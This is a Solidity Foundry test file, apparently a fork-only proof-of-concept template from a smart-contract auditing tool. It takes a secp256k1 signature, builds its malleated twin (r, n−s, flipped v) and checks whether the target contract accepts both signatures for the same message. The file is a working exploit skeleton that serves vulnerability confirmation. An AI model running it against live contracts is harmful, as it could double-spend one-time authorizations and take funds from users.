// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Signature malleability (low-s not enforced)
/// @notice Detector: signature-malleability. The target verifies a
///         signature without enforcing low-s, so a signature (v, r, s)
///         can be transformed into a DIFFERENT valid signature
///         (v', r, n - s) for the same message -- double-spending a
///         "one signature" allowance, or forging a second authorization.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt the digest + entry point to
///      the target's real signature scheme.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    uint256 public constant SIGNER_KEY = 0xA11CE;
    // TODO: the exact message hash the target verifies.
    bytes32 public constant MESSAGE_HASH = bytes32(0);
    // secp256k1 curve order.
    uint256 public constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(MESSAGE_HASH != bytes32(0), "set MESSAGE_HASH to the target's signed message hash");

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_KEY, MESSAGE_HASH);
        // Malleated twin: same message, different (v, s).
        uint8 v2 = v == 27 ? 28 : 27;
        bytes32 s2 = bytes32(N - uint256(s));
        require(s2 != s, "degenerate signature -- pick another message");

        bytes memory sig1 = abi.encodePacked(r, s, v);
        bytes memory sig2 = abi.encodePacked(r, s2, v2);

        // TODO: adapt to the target's real signature entry point.
        (bool firstOk,) = target.call(
            abi.encodeWithSignature("submit(bytes32,bytes)", MESSAGE_HASH, sig1)
        );
        require(firstOk, "original signature rejected -- adapt the digest / entry point");
        (bool secondOk,) = target.call(
            abi.encodeWithSignature("submit(bytes32,bytes)", MESSAGE_HASH, sig2)
        );
        console.log("original sig accepted:", firstOk);
        console.log("malleated sig accepted:", secondOk);
        assertTrue(secondOk, "exploit did not reproduce: malleated signature was rejected (low-s enforced)");

    }
}
